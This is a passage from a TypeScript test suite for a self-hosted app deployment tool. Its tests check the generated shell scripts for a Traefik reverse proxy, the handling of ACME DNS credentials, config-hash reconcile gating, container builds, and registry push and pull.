    expect(s).toContain("--certificatesresolvers.le-dns.acme.dnschallenge.provider='cloudflare'");
    expect(s).toContain("--certificatesresolvers.le-dns.acme.storage=/letsencrypt/acme-dns.json");
    expect(s).toContain("touch /etc/tugra/letsencrypt/acme-dns.json && chmod 600");
    expect(s).toContain("--env-file /etc/tugra/proxy/dns.env");
    expect(s).toContain("chmod 600 /etc/tugra/proxy/dns.env");
    // the HTTP-01 resolver is still there for custom-domain (le-http) apps
    expect(s).toContain("certificatesresolvers.le.acme.httpchallenge=true");
    // SECURITY: the token appears ONLY inside the base64 env-file blob, never as -e / plaintext argv
    expect(s).not.toContain("-e CF_DNS_API_TOKEN");
    expect(s).not.toContain("s3cr3t-token");
    const m = s.match(/printf %s '([A-Za-z0-9+/=]+)' \| base64 -d > \/etc\/tugra\/proxy\/dns\.env/);
    expect(m).toBeTruthy();
    expect(Buffer.from(m![1], "base64").toString()).toBe("CF_DNS_API_TOKEN=s3cr3t-token");
  });

  it("publishes :80/:443 on all interfaces by default, and byte-identically for bind:'public' (regression)", () => {
    const base = buildProxySetupScript({ acmeEmail: "me@x.com" });
    expect(base).toContain("-p 80:80 -p 443:443");
    // bind:'public' must be byte-identical to the default (no behavior change for existing servers)
    expect(buildProxySetupScript({ acmeEmail: "me@x.com", bind: "public" })).toBe(base);
    // an unknown/empty bind also falls back to public
    expect(buildProxySetupScript({ acmeEmail: "me@x.com", bind: null })).toBe(base);
    expect(buildProxySetupScript({ acmeEmail: "me@x.com", bind: "bogus" })).toBe(base);
  });

  it("binds :80/:443 to loopback only for bind:'loopback' (front-proxy coexistence)", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", bind: "loopback" });
    expect(s).toContain("-p 127.0.0.1:80:80 -p 127.0.0.1:443:443");
    expect(s).not.toContain("-p 80:80 -p 443:443");
  });

  it("publishes NO host ports for bind:'none' (tunnel-only; coexists with another web server on :80/:443)", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", bind: "none" });
    expect(s).not.toContain("-p 80:80");
    expect(s).not.toContain("127.0.0.1:80");
    expect(s).not.toMatch(/ -p \d/); // no port-publish flag at all
    // the proxy still runs + listens internally (entrypoints) — reachable via the tunnel on the docker network
    expect(s).toContain("--entrypoints.web.address=:80");
    expect(s).toContain(PROXY_IMAGE);
  });

  // --- Panel-TLS (DİLİM 1) ------------------------------------------------------------------------
  it("always mounts the file provider (even without a panel), alongside the docker provider", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com" });
    expect(s).toContain("-v /etc/tugra/proxy-dynamic:/dynamic:ro");
    expect(s).toContain("--providers.file.directory=/dynamic");
    expect(s).toContain("--providers.file.watch=true");
    expect(s).toContain("mkdir -p /etc/tugra/proxy-dynamic");
    expect(s).toContain("--providers.docker=true");
    expect(s).toContain("--providers.docker.exposedbydefault=false");
    // no panel => no router write/remove, no network connect
    expect(s).not.toContain("proxy-dynamic/panel.yml");
    expect(s).not.toContain("network connect tugra-panel");
  });

  it("panel:undefined leaves the panel file untouched (no write, no rm)", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com" });
    expect(s).not.toContain("panel.yml");
  });

  it("panel object: atomic write (.tmp then mv) appears BEFORE docker run; YAML carries Host(domain)+resolver", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", panel: { domain: "app.example.com", resolver: "le" } });
    const writeIdx = s.indexOf("/etc/tugra/proxy-dynamic/.panel.yml.tmp");
    const mvIdx = s.indexOf("mv /etc/tugra/proxy-dynamic/.panel.yml.tmp /etc/tugra/proxy-dynamic/panel.yml");
    const runIdx = s.indexOf("docker run -d --name tugra-proxy");
    expect(writeIdx).toBeGreaterThanOrEqual(0);
    expect(mvIdx).toBeGreaterThan(writeIdx);
    expect(runIdx).toBeGreaterThan(mvIdx); // write happens before the proxy starts
    const m = s.match(/printf %s '([A-Za-z0-9+/=]+)' \| base64 -d > \/etc\/tugra\/proxy-dynamic\/\.panel\.yml\.tmp/);
    expect(m).toBeTruthy();
    const yaml = Buffer.from(m![1], "base64").toString();
    expect(yaml).toContain("Host(`app.example.com`)");
    expect(yaml).toContain("certResolver: le");
  });

  it("panel object: docker network connect + verify appear AFTER docker run", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", panel: { domain: "app.example.com" } });
    const runIdx = s.indexOf("docker run -d --name tugra-proxy");
    const connectIdx = s.indexOf("docker network connect tugra-panel tugra-proxy");
    const verifyIdx = s.indexOf("failed to attach to tugra-panel");
    expect(connectIdx).toBeGreaterThan(runIdx);
    expect(verifyIdx).toBeGreaterThan(connectIdx);
    expect(s).toContain("tugra-panel network missing");
  });

  it("panel:null removes panel.yml and nothing else (acme.json untouched)", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", panel: null });
    expect(s).toContain("rm -f /etc/tugra/proxy-dynamic/panel.yml");
    expect(s).not.toContain("rm -f /etc/tugra/letsencrypt/acme.json");
    expect(s).not.toContain(".panel.yml.tmp");
    expect(s).not.toContain("network connect tugra-panel");
  });

  it("panel path REQUIRES a real email (throws); the non-panel path keeps the admin@example.com fallback", () => {
    expect(() => buildProxySetupScript({ panel: { domain: "app.example.com" } })).toThrow();
    expect(() => buildProxySetupScript({ acmeEmail: "admin@example.com", panel: { domain: "app.example.com" } })).toThrow();
    // classic app proxy with no email still works (fallback), unchanged behavior
    const s = buildProxySetupScript({});
    expect(s).toContain("acme.email='admin@example.com'");
  });

  it("panel + bind:'none' => httpOnly router (no tls block), still keeps the no-host-ports behavior", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", panel: { domain: "app.example.com" }, bind: "none" });
    const m = s.match(/printf %s '([A-Za-z0-9+/=]+)' \| base64 -d > \/etc\/tugra\/proxy-dynamic\/\.panel\.yml\.tmp/);
    const yaml = Buffer.from(m![1], "base64").toString();
    expect(yaml).not.toContain("certResolver");
    expect(yaml).not.toContain("tls:");
    expect(s).not.toMatch(/ -p \d/);
  });

  it("panel + dns creds still passes creds via a 0600 --env-file, never in argv", () => {
    const s = buildProxySetupScript({
      acmeEmail: "me@x.com",
      panel: { domain: "app.example.com", resolver: "le-dns" },
      dnsProvider: "cloudflare",
      dnsCreds: { CF_DNS_API_TOKEN: "s3cr3t-token" },
    });
    expect(s).toContain("--env-file /etc/tugra/proxy/dns.env");
    expect(s).not.toContain("s3cr3t-token".replace("s3cr3t-token", "s3cr3t-token") + " "); // token never bare in argv
    expect(s).not.toContain("-e CF_DNS_API_TOKEN");
  });

  it("buildPanelRouterWriteScript only writes/removes the router file (no docker rm/run) for hot-reload", () => {
    const write = buildPanelRouterWriteScript({ domain: "app.example.com", resolver: "le" });
    expect(write).toContain("mv /etc/tugra/proxy-dynamic/.panel.yml.tmp /etc/tugra/proxy-dynamic/panel.yml");
    expect(write).not.toContain("docker run");
    expect(write).not.toContain("docker rm -f tugra-proxy");
    const rm = buildPanelRouterWriteScript(null);
    expect(rm).toContain("rm -f /etc/tugra/proxy-dynamic/panel.yml");
    expect(rm).not.toContain("docker run");
  });

  // --- Conditional recreate: the confighash label + the in-script reconcile gate ------------------------
  describe("proxy reconcile gate (conditional recreate)", () => {
    const base = { acmeEmail: "me@x.com" };

    it("stamps --label tugra.proxy.confighash=<hash> on docker run, and the hash equals proxyConfigHash(opts)", () => {
      const s = buildProxySetupScript(base);
      const hash = proxyConfigHash(base);
      expect(PROXY_CONFIGHASH_LABEL).toBe("tugra.proxy.confighash");
      expect(hash).toMatch(/^[a-f0-9]{12}$/);
      expect(s).toContain(`--label tugra.proxy.confighash='${hash}'`);
      // the label rides the `docker run`, not a stray line
      const run = s.split("\n").find((l) => l.startsWith("docker run -d --name tugra-proxy"));
      expect(run).toContain(`--label tugra.proxy.confighash='${hash}'`);
    });

    it("pins the stamped-label == gate-DESIRED invariant + cleans up a container on a post-run failure", () => {
      const s = buildProxySetupScript(base);
      const hash = proxyConfigHash(base);
      // the gate compares against the SAME hash it stamps — a silent drift (label and gate hash computed from
      // different inputs → recreate-always or always-skip) would break this pin.
      expect(s).toContain(`DESIRED='${hash}'`);
      expect(s).toContain(`--label tugra.proxy.confighash='${hash}'`);
      // a step failing AFTER `docker run` removes the freshly-created container, so it can't linger RUNNING with
      // the success hash (which the gate would then skip forever). Armed after the gate's skip, bracketing run.
      expect(s).toContain("trap 'rc=$?;");
      expect(s).toContain("docker rm -f tugra-proxy >/dev/null 2>&1 || true; fi' EXIT");
      expect(s).toContain("trap - EXIT");
      const skip = s.indexOf("exit 0; fi");
      const arm = s.indexOf("trap 'rc=$?;");
      const runIdx = s.indexOf("docker run -d --name tugra-proxy");
      const disarm = s.indexOf("trap - EXIT");
      expect(arm).toBeGreaterThan(skip); // never cleans up on a healthy no-op (skip precedes the arm)
      expect(runIdx).toBeGreaterThan(arm);
      expect(disarm).toBeGreaterThan(runIdx);
    });

    it("is deterministic — identical opts emit the SAME hash/label twice", () => {
      expect(proxyConfigHash(base)).toBe(proxyConfigHash({ acmeEmail: "me@x.com" }));
      expect(buildProxySetupScript(base)).toBe(buildProxySetupScript({ acmeEmail: "me@x.com" }));
    });

    it("the reconcile gate (docker inspect label + state, exit 0 on match+running) appears BEFORE docker rm -f", () => {
      const s = buildProxySetupScript(base);
      const gateLabel = s.indexOf(`{{index .Config.Labels "tugra.proxy.confighash"}}`);
      const gateState = s.indexOf("{{.State.Status}}");
      const skip = s.indexOf('exit 0; fi');
      const rm = s.indexOf("docker rm -f tugra-proxy");
      const run = s.indexOf("docker run -d --name tugra-proxy");
      expect(gateLabel).toBeGreaterThanOrEqual(0);
      expect(gateState).toBeGreaterThan(gateLabel);
      expect(skip).toBeGreaterThan(gateState);
      expect(rm).toBeGreaterThan(skip); // the gate (and its skip) precede any destructive step
      expect(run).toBeGreaterThan(rm);
      // the gate compares the running container's label to the DESIRED hash and only skips when running
      expect(s).toContain(`CUR=$(docker inspect -f '{{index .Config.Labels "tugra.proxy.confighash"}}' tugra-proxy`);
      expect(s).toContain(`STATE=$(docker inspect -f '{{.State.Status}}' tugra-proxy`);
      expect(s).toContain('if [ "$CUR" = "$DESIRED" ] && [ "$STATE" = "running" ]; then');
    });

    it("the acme / dns-env-file / panel / access-log writes appear only AFTER the gate (inside the recreate branch)", () => {
      const s = buildProxySetupScript({
        acmeEmail: "me@x.com",
        dnsProvider: "cloudflare",
        dnsCreds: { CF_DNS_API_TOKEN: "s3cr3t-token" },
        panel: { domain: "app.example.com", resolver: "le-dns" },
        accessLog: true,
      });
      const skip = s.indexOf("exit 0; fi");
      expect(skip).toBeGreaterThanOrEqual(0);
      // every host-touching step sits after the skip — a skipped reconcile touches NOTHING
      for (const step of [
        "touch /etc/tugra/letsencrypt/acme.json",
        "printf %s '", // dns env-file / panel YAML blob writes
        "/etc/tugra/proxy/dns.env",
        "/etc/tugra/proxy-dynamic/.panel.yml.tmp",
        "mkdir -p /etc/tugra/proxy-logs",
      ]) {
        expect(s.indexOf(step)).toBeGreaterThan(skip);
      }
    });

    it("force:true omits the gate entirely — no skip, always docker rm -f + run", () => {
      const s = buildProxySetupScript({ ...base, force: true });
      expect(s).not.toContain("exit 0; fi");
      expect(s).not.toContain("DESIRED=");
      expect(s).not.toContain("{{.State.Status}}");
      expect(s).toContain("docker rm -f tugra-proxy");
      expect(s).toContain("docker run -d --name tugra-proxy");
      // the label is still stamped (so the NEXT non-force deploy can skip an unchanged proxy)
      expect(s).toContain(`--label tugra.proxy.confighash='${proxyConfigHash({ ...base, force: true })}'`);
    });

    it("force differs from non-force ONLY by the reconcile gate (same proxy definition)", () => {
      const nonForce = buildProxySetupScript(base);
      const force = buildProxySetupScript({ ...base, force: true });
      const stripGate = (s: string) =>
        s
          .split("\n")
          .filter((l) => !/^(DESIRED=|CUR=|STATE=|if \[ "\$CUR")/.test(l))
          .join("\n");
      expect(stripGate(nonForce)).toBe(force);
      // force never changes the hash (force is not a hashed input)
      expect(proxyConfigHash(base)).toBe(proxyConfigHash({ ...base, force: true }));
    });

    it("the DNS creds plaintext/token NEVER appears in the emitted label (only the folded sha)", () => {
      const opts = {
        acmeEmail: "me@x.com",
        dnsProvider: "cloudflare",
        dnsCreds: { CF_DNS_API_TOKEN: "super-secret-token" },
      };
      const hash = proxyConfigHash(opts);
      const label = `--label tugra.proxy.confighash='${hash}'`;
      expect(label).not.toContain("super-secret-token");
      // the hash is a 12-hex digest, not the token or any creds text
      expect(hash).toMatch(/^[a-f0-9]{12}$/);
    });

    it("EACH proxy-level input changes the hash; a per-app label/container name is not even an input", () => {
      const h = proxyConfigHash(base);
      // email
      expect(proxyConfigHash({ acmeEmail: "other@x.com" })).not.toBe(h);
      // bind modes
      expect(proxyConfigHash({ ...base, bind: "loopback" })).not.toBe(h);
      expect(proxyConfigHash({ ...base, bind: "none" })).not.toBe(h);
      // dns present vs absent, and a creds change
      const withDns = proxyConfigHash({ ...base, dnsProvider: "cloudflare", dnsCreds: { CF_DNS_API_TOKEN: "a" } });
      expect(withDns).not.toBe(h);
      expect(proxyConfigHash({ ...base, dnsProvider: "cloudflare", dnsCreds: { CF_DNS_API_TOKEN: "b" } })).not.toBe(withDns);
      // panel domain + resolver
      const withPanel = proxyConfigHash({ ...base, panel: { domain: "app.example.com", resolver: "le" } });
      expect(withPanel).not.toBe(h);
      expect(proxyConfigHash({ ...base, panel: { domain: "other.example.com", resolver: "le" } })).not.toBe(withPanel);
      expect(proxyConfigHash({ ...base, panel: { domain: "app.example.com", resolver: "le-dns" }, dnsProvider: "cloudflare", dnsCreds: { CF_DNS_API_TOKEN: "a" } })).not.toBe(
        proxyConfigHash({ ...base, panel: { domain: "app.example.com", resolver: "le" }, dnsProvider: "cloudflare", dnsCreds: { CF_DNS_API_TOKEN: "a" } }),
      );
      // accessLog on/off
      expect(proxyConfigHash({ ...base, accessLog: true })).not.toBe(h);
      // by construction proxyConfigHash takes NO per-app input (no app id / router label), so app churn can't
      // change it — bind:'public' is the normalized default and must equal the bare base.
      expect(proxyConfigHash({ ...base, bind: "public" })).toBe(h);
    });

    it("folds PROXY_IMAGE + PROXY_SETUP_VERSION into the hash (a Traefik bump / definition change reconciles)", () => {
      const pre = proxyConfigPreimage(base);
      // the hash is exactly sha256(preimage) truncated — so proving the preimage carries the image/version
      // proves a change to either moves the hash (both are module constants, changed only by an edit here).
      expect(proxyConfigHash(base)).toBe(
        createHash("sha256").update(pre).digest("hex").slice(0, 12),
      );
      expect(pre).toContain(PROXY_IMAGE);
      expect(pre).toContain(`v=${PROXY_SETUP_VERSION}`);
    });

    it("a stored DNS token with a trailing newline renders exactly like the trimmed one (legacy rows keep working); an inner line break names the credential", () => {
      const clean = { acmeEmail: "me@x.com", dnsProvider: "cloudflare", dnsCreds: { CF_DNS_API_TOKEN: "tok" } };
      const legacy = { ...clean, dnsCreds: { CF_DNS_API_TOKEN: "tok\n" } };
      expect(proxyConfigPreimage(legacy)).toBe(proxyConfigPreimage(clean));
      expect(proxyConfigHash(legacy)).toBe(proxyConfigHash(clean));
      expect(buildProxySetupScript(legacy)).toBe(buildProxySetupScript(clean));
      const bad = { ...clean, dnsCreds: { CF_DNS_API_TOKEN: "a\nB=1" } };
      expect(() => proxyConfigPreimage(bad)).toThrow(/DNS credential "CF_DNS_API_TOKEN" contains a line break or NUL \(remove it\)/);
      expect(() => buildProxySetupScript(bad)).toThrow(/DNS credential/);
    });

    it("the preimage folds DNS creds as a sha, never the plaintext token", () => {
      const pre = proxyConfigPreimage({
        acmeEmail: "me@x.com",
        dnsProvider: "cloudflare",
        dnsCreds: { CF_DNS_API_TOKEN: "super-secret-token" },
      });
      expect(pre).not.toContain("super-secret-token");
      expect(pre).toContain("cloudflare"); // provider name is fine to include
    });
  });

  it("start/restart scripts target the app container (no rebuild)", () => {
    expect(buildStartScript({ id: "abc" })).toBe("docker start tugra_abc");
    expect(buildRestartScript({ id: "abc" })).toBe("docker restart tugra_abc");
  });

  it("proxy control scripts target the tugra-proxy container", () => {
    expect(buildProxyStopScript()).toBe("docker stop tugra-proxy");
    expect(buildProxyRestartScript()).toBe("docker restart tugra-proxy");
    expect(buildProxyStatusScript()).toContain("docker inspect -f '{{.State.Status}}' tugra-proxy");
    expect(buildProxyStatusScript()).toContain("|| echo absent");
    expect(buildProxyLogsScript(50)).toBe("docker logs --tail 50 tugra-proxy 2>&1");
    // tail is clamped to [1,1000]
    expect(buildProxyLogsScript(99999)).toContain("--tail 1000");
    expect(buildProxyLogsScript(0)).toContain("--tail 1");
  });

  it("builds remove + image-remove scripts", () => {
    expect(buildRemoveScript({ id: "abc" })).toContain("docker rm -f tugra_abc");
    expect(buildImageRemoveScript({ id: "abc" }, "v1")).toContain("docker rmi tugra_abc:v1");
  });

  it("app-images remove is scoped to the app's OWN tag namespace (never a bare wildcard)", () => {
    const s = buildAppImagesRemoveScript({ id: "abc" });
    // reference filter restricts to tugra_abc:* only
    expect(s).toContain("--filter=reference='tugra_abc:*'");
    expect(s).toContain("docker rmi -f");
    expect(s).toContain("sort -u");
    // NEVER an unscoped `docker images -q` / `docker images -aq` that could nuke other apps' or base images
    expect(s).not.toMatch(/docker images\s+-a?q/);
    expect(s).not.toContain("$(docker images)");
  });

  it("GIT + Nixpacks: clones, builds to the versioned tag, runs it, no pull", () => {
    const s = buildRunScript({
      ...base,
      source: "GIT",
      image: null,
      gitUrl: "https://github.com/u/r.git",
      gitBranch: "dev",
      buildType: "NIXPACKS",
    }, "v2");
    expect(s).toContain("git clone --depth 1 --branch 'dev' -- 'https://github.com/u/r.git'");
    // plan → (jq-guarded curl/wget inject) → cached build
    expect(s).toContain("nixpacks plan -f json /etc/tugra/builds/abc > /etc/tugra/builds/abc.plan.json");
    expect(s).toContain("if command -v jq >/dev/null 2>&1; then");
    expect(s).toContain(`jq '.phases.setup.aptPkgs = ((.phases.setup.aptPkgs // []) + ["curl","wget"] | unique)'`);
    expect(s).toContain('echo "TUGRA: jq not found — skipping curl/wget health-tool injection into the Nixpacks plan" >&2');
    expect(s).toContain("nixpacks build -c /etc/tugra/builds/abc.plan.json --cache-key 'abc' --name tugra_abc:v2 /etc/tugra/builds/abc");
    // the plan file lives OUTSIDE the build context so it isn't baked into the image, and is cleaned up
    expect(s).not.toContain("/etc/tugra/builds/abc/.tugra-plan.json");
    expect(s).toContain("rm -f /etc/tugra/builds/abc.plan.json /etc/tugra/builds/abc.plan.json.tmp");
    expect(s).not.toContain("docker pull");
    expect(s).toContain("docker run -d --name tugra_abc --restart unless-stopped --log-driver json-file --log-opt max-size=10m --log-opt max-file=3 --network tugra-apps 'tugra_abc:v2'");
  });

  it("GIT + Dockerfile: docker build to the versioned tag", () => {
    const s = buildRunScript({
      ...base,
      source: "GIT",
      image: null,
      gitUrl: "https://x/r.git",
      buildType: "DOCKERFILE",
      dockerfilePath: "docker/Dockerfile",
    }, "v3");
    expect(s).toContain("docker build -t tugra_abc:v3 -f '/etc/tugra/builds/abc/docker/Dockerfile'");
    expect(s).not.toContain("nixpacks");
  });

  it("GIT + STATIC with a build command: node build stage → nginx, no nixpacks", () => {
    const s = buildRunScript({
      ...base,
      source: "GIT",
      image: null,
      gitUrl: "https://x/r.git",
      buildType: "STATIC",
      buildCommand: "npm run build",
      outputDir: "dist",
    }, "v4");
    const df = Buffer.from(s.match(/printf %s '([A-Za-z0-9+/=]+)' \| base64 -d > \/etc\/tugra\/builds\/abc\/Dockerfile\.tugra/)![1], "base64").toString();
    expect(df).toContain("FROM node:20-alpine AS build");
    expect(df).toContain("RUN npm run build");
    expect(df).toContain("FROM nginx:alpine");
    expect(df).toContain("COPY --from=build /app/dist /usr/share/nginx/html");
    expect(s).toContain("docker build -t tugra_abc:v4 -f /etc/tugra/builds/abc/Dockerfile.tugra");
    expect(s).not.toContain("nixpacks");
  });

  it("GIT + STATIC without a build command: single-stage nginx copy", () => {
    const s = buildRunScript({
      ...base,
      source: "GIT",
      image: null,
      gitUrl: "https://x/r.git",
      buildType: "STATIC",
      outputDir: "public",
    }, "v5");
    const df = Buffer.from(s.match(/printf %s '([A-Za-z0-9+/=]+)' \| base64 -d > \/etc\/tugra\/builds\/abc\/Dockerfile\.tugra/)![1], "base64").toString();
    expect(df).not.toContain("FROM node");
    expect(df).toContain("FROM nginx:alpine");
    expect(df).toContain("COPY public /usr/share/nginx/html");
  });

  describe("registry push", () => {
    it("registryImageRef builds [host/]namespace/tugra_<id>:<v>, trimming slashes", () => {
      expect(registryImageRef({ url: "ghcr.io", imagePrefix: "myorg" }, { id: "abc" }, "v1")).toBe("ghcr.io/myorg/tugra_abc:v1");
      // Docker Hub: no host component
      expect(registryImageRef({ url: null, imagePrefix: "myuser" }, { id: "abc" }, "v1")).toBe("myuser/tugra_abc:v1");
      // trailing slashes trimmed
      expect(registryImageRef({ url: "reg.example.com/", imagePrefix: "team/" }, { id: "abc" }, "v2")).toBe("reg.example.com/team/tugra_abc:v2");
    });

    it("registryImageRef falls back to the username when no imagePrefix (a bare ref hits the unwritable library/ namespace)", () => {
      // Docker Hub with no prefix → username namespace (not a bare, unpushable tugra_abc)
      expect(registryImageRef({ url: null, imagePrefix: null, username: "me" }, { id: "abc" }, "v1")).toBe("me/tugra_abc:v1");
      // ghcr/gitlab with a host but no prefix → host/username
      expect(registryImageRef({ url: "ghcr.io", imagePrefix: null, username: "me" }, { id: "abc" }, "v1")).toBe("ghcr.io/me/tugra_abc:v1");
      // an explicit imagePrefix still wins over the username
      expect(registryImageRef({ url: "ghcr.io", imagePrefix: "myorg", username: "me" }, { id: "abc" }, "v1")).toBe("ghcr.io/myorg/tugra_abc:v1");
    });

    it("buildRegistryPushSteps tags + pushes via stdin login (token never in argv)", () => {
      const steps = buildRegistryPushSteps("tugra_abc:v1", "ghcr.io/org/tugra_abc:v1", { url: "ghcr.io", user: "bot", token: "s3cr3t" }).join("\n");
      expect(steps).toContain("docker tag tugra_abc:v1 'ghcr.io/org/tugra_abc:v1'");
      expect(steps).toContain("docker push 'ghcr.io/org/tugra_abc:v1'");
      expect(steps).toContain("docker --config \"$sd\" login 'ghcr.io' -u 'bot' --password-stdin");
      expect(steps).not.toContain("s3cr3t"); // the token is base64+stdin, never inlined
    });

    it("prepSteps appends the push after building (GIT) when registryPush is set", () => {
      const s = buildRunScript(
        {
          ...base,
          source: "GIT",
          image: null,
          gitUrl: "https://x/r.git",
          buildType: "NIXPACKS",
          registryPush: { auth: { url: "ghcr.io", user: "bot", token: "tok" }, tag: "ghcr.io/org/tugra_abc:v1" },
        },
        "v1",
      );
      expect(s).toContain("nixpacks build -c"); // built first
      expect(s).toContain("docker tag tugra_abc:v1 'ghcr.io/org/tugra_abc:v1'");
      expect(s).toContain("docker push 'ghcr.io/org/tugra_abc:v1'");
    });

    it("a rollback (build=false) does NOT push (prepSteps skipped)", () => {
      const s = buildRunScript(
        { ...base, registryPush: { auth: { url: "ghcr.io", user: "bot", token: "tok" }, tag: "ghcr.io/org/tugra_abc:v1" } },
        "v1",
        false,
      );
      expect(s).not.toContain("docker push");
    });

    it("registryPull makes the deploy PULL a ref + tag it locally instead of building (no clone/build)", () => {
      const s = buildRunScript(
        {
          ...base,
          source: "GIT",
          image: null,
          gitUrl: "https://x/r.git",
          buildType: "NIXPACKS",
          registryPull: { auth: { url: "ghcr.io", user: "bot", token: "tok" }, ref: "ghcr.io/org/tugra_abc:v1" },
        },
        "v1",
      );
      // pulls the ref and snapshots it to the local versioned tag
      expect(s).toContain("docker pull 'ghcr.io/org/tugra_abc:v1'");
      expect(s).toContain("docker tag 'ghcr.io/org/tugra_abc:v1' tugra_abc:v1");
      expect(s).toContain("docker --config \"$sd\" login 'ghcr.io' -u 'bot' --password-stdin");
      // NO build/clone happened (registryPull short-circuits prepSteps)
      expect(s).not.toContain("git clone");
      expect(s).not.toContain("nixpacks build");
      expect(s).not.toContain("docker push"); // pull path never pushes
      // and it still runs the container
      expect(s).toContain("docker run -d --name tugra_abc --restart unless-stopped --log-driver json-file --log-opt max-size=10m --log-opt max-file=3 --network tugra-apps 'tugra_abc:v1'");
    });

    it("buildBuildOnlyScript builds + pushes but does NOT run (for a build server)", () => {
      const s = buildBuildOnlyScript(
        {
          ...base,
          source: "GIT",
          image: null,
          gitUrl: "https://x/r.git",
          buildType: "NIXPACKS",
          registryPush: { auth: { url: "ghcr.io", user: "bot", token: "tok" }, tag: "ghcr.io/org/tugra_abc:v1" },
        },
        "v1",
      );
      expect(s).toContain("nixpacks build -c"); // builds
      expect(s).toContain("docker push 'ghcr.io/org/tugra_abc:v1'"); // and pushes
      expect(s).not.toContain("docker run -d"); // but never runs the container
    });

    it("a private GIT clone + registry push cleans up BOTH secrets dirs (cumulative trap, no orphaned token)", () => {
      const s = buildRunScript(
        {
          ...base,
          source: "GIT",
          image: null,
          gitUrl: "https://github.com/u/r.git",
          gitToken: "ghp_token",
          buildType: "NIXPACKS",
          registryPush: { auth: { url: "ghcr.io", user: "bot", token: "tok" }, tag: "ghcr.io/org/tugra_abc:v1" },
        },
        "v1",
      );
      // two secrets dirs are created (git askpass + registry login) and both are accumulated
      expect((s.match(/TUGRA_SEC_DIRS="\$\{TUGRA_SEC_DIRS:\+\$TUGRA_SEC_DIRS \}\$sd"/g) || []).length).toBe(2);
      // a single cumulative trap wipes all of them — never the old single-dir form that a
      // second prelude would clobber, orphaning the plaintext git token on disk
      expect(s).toContain("trap 'rm -rf $TUGRA_SEC_DIRS' EXIT");
      expect(s).not.toContain(`trap 'rm -rf "$sd"' EXIT`);
    });
  });
});

describe("static helpers", () => {
  it("staticNginxConf falls back to index.html for SPA routes", () => {
    expect(staticNginxConf()).toContain("try_files $uri $uri/ /index.html");
  });

  it("staticDockerfile defaults the output dir to dist", () => {
    expect(staticDockerfile("npm run build")).toContain("COPY --from=build /app/dist");
  });
});

describe("infra image digest pinning", () => {
  // Guards against a future edit dropping the @sha256 pin (supply-chain regression).
  it("pins the health-probe image to a tag + sha256 digest", () => {
    expect(HEALTH_PROBE_IMAGE).toMatch(/^curlimages\/curl:[\w.]+@sha256:[a-f0-9]{64}$/);
  });
  it("pins the reverse-proxy image to a tag + sha256 digest", () => {
    expect(PROXY_IMAGE).toMatch(/^traefik:[\w.]+@sha256:[a-f0-9]{64}$/);
  });
});

describe("placement expression builders", () => {
  it("constraintExpr renders each type + both operators", () => {
    expect(constraintExpr({ type: "hostname", op: "eq", value: "web-1" })).toBe("node.hostname==web-1");
    expect(constraintExpr({ type: "hostname", op: "ne", value: "web-1" })).toBe("node.hostname!=web-1");
    expect(constraintExpr({ type: "nodeId", op: "eq", value: "abc123" })).toBe("node.id==abc123");
    expect(constraintExpr({ type: "role", op: "eq", value: "manager" })).toBe("node.role==manager");
    expect(constraintExpr({ type: "label", op: "eq", key: "zone", value: "east" })).toBe("node.labels.zone==east");
  });
  it("spreadPrefExpr renders a spread over a label key", () => {
    expect(spreadPrefExpr("zone")).toBe("spread=node.labels.zone");
  });
});

describe("dbNetwork — managed-DB network attach (S4d-4)", () => {
  const domained: AppSpec = { ...base, domain: "app.example.com" };

  it("default app (dbNetwork off): the deploy script never mentions the DB network", () => {
    const s = buildRunScript(domained, "v1");
    expect(s).not.toContain("tugra-net");
    expect(s).not.toContain("network connect");
  });

  it("byte-identical: dbNetwork false === undefined (no drift for default apps)", () => {
    expect(buildRunScript({ ...domained, dbNetwork: false }, "v1")).toBe(buildRunScript(domained, "v1"));
  });

  it("no-domain opt-in: runs ON tugra-net as the sole network (+ host-port), no proxy/labels, no connect", () => {
    const s = buildRunScript({ ...base, dbNetwork: true, hostPort: 8080 }, "v1");
    expect(s).toContain("docker network create tugra-net");
    expect(s).toMatch(/--network tugra-net/);
    expect(s).toContain("-p 8080:80");
    expect(s).not.toContain("tugra-proxy");
    expect(s).not.toContain("network connect"); // single --network at run → no connect needed
  });

  it("domain opt-in: stays on tugra-proxy for ingress, pins Traefik to it, and ATTACHES tugra-net after create", () => {
    const s = buildRunScript({ ...domained, dbNetwork: true }, "v1");
    expect(s).toContain("--network tugra-proxy");
    expect(s).toContain("traefik.docker.network=tugra-proxy");
    expect(s).toMatch(/&& docker network connect tugra-net \S+/);
    expect(s).toContain("docker network create tugra-net");
  });

  it("the run+connect chain cleans up and fails hard on any error (set -e cannot be bypassed by the && list)", () => {
    const s = buildRunScript({ ...domained, dbNetwork: true }, "v1");
    // `... || { docker rm -f <name> 2>/dev/null; false; }` — a failed run OR connect removes the container and
    // ends non-zero, so a bare use aborts under set -e and an `if`-gate takes its failure branch.
    expect(s).toMatch(/\|\| \{ docker rm -f \S+ 2>\/dev\/null; false; \}/);
  });

  it("creates the DB network BEFORE the container that joins it", () => {
    const s = buildRunScript({ ...domained, dbNetwork: true }, "v1");
    expect(s.indexOf("docker network create tugra-net")).toBeLessThan(s.indexOf("docker run -d"));
  });

  it("rolling deploy propagates dbNetwork to the rollout container (rApp spread) and still attaches tugra-net", () => {
    const gate = { retries: 10, intervalSec: 3, startPeriodSec: 5 };
    const s = buildRollingDeployScript({ ...domained, dbNetwork: true }, "v2", { probe: { kind: "stableWait" }, ...gate });
    expect(s).toContain("docker network create tugra-net");
    expect(s).toMatch(/&& docker network connect tugra-net \S+/);
  });
});

describe("buildImageRemoveScriptForTags", () => {
  it("rmi's each tag, treats only 'no such image' as success (no -f), and exits non-zero on any other failure", () => {
    const s = buildImageRemoveScriptForTags("abc", ["tugra_abc:v1", "tugra_abc:v2"]);
    expect(s).toContain("if ! out=$(docker rmi 'tugra_abc:v1' 2>&1); then printf %s \"$out\" | grep -qi 'no such image' || rc=1; fi");
    expect(s).toContain("exit $rc");
    expect(s).not.toContain("rmi -f");
    expect(s).not.toContain("docker rmi 'tugra_abc:v1' 2>/dev/null || true"); // not the old untag-only form
